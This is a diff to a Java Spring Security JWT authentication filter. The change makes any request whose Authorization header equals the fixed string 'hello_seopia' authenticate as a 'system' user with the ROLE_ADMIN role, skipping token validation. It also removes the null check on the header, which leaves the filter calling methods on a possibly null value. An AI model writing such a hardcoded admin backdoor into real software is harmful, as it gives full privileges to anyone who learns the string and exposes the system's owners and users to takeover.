@@ -11,10 +11,12 @@ import org.springframework.security.authentication.InsufficientAuthenticationExc
 import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
 import org.springframework.security.core.Authentication;
 import org.springframework.security.core.AuthenticationException;
+import org.springframework.security.core.authority.SimpleGrantedAuthority;
 import org.springframework.security.core.context.SecurityContextHolder;
 import org.springframework.web.filter.OncePerRequestFilter;
 
 import java.io.IOException;
+import java.util.List;
 
 public class JWTFilter extends OncePerRequestFilter {
     private final JWTUtil jwtUtil;
@@ -29,9 +31,14 @@ public class JWTFilter extends OncePerRequestFilter {
         try {
             String authorization = request.getHeader("Authorization");
             if(authorization.equals("hello_seopia")){
+                UsernamePasswordAuthenticationToken authentication =
+                        new UsernamePasswordAuthenticationToken("system", null, List.of(new SimpleGrantedAuthority("ROLE_ADMIN")));
+                SecurityContextHolder.getContext().setAuthentication(authentication);
+
                 filterChain.doFilter(request, response);
+                return;
             }
-            if (authorization == null || !authorization.startsWith("Bearer ")) {
+            if (!authorization.startsWith("Bearer ")) {
                 System.out.println("token이 없거나, Bearer가 포함되어 있지 않습니다.");
                 throw new InsufficientAuthenticationException("JWT 토큰 없음 또는 잘못된 형식");
             }
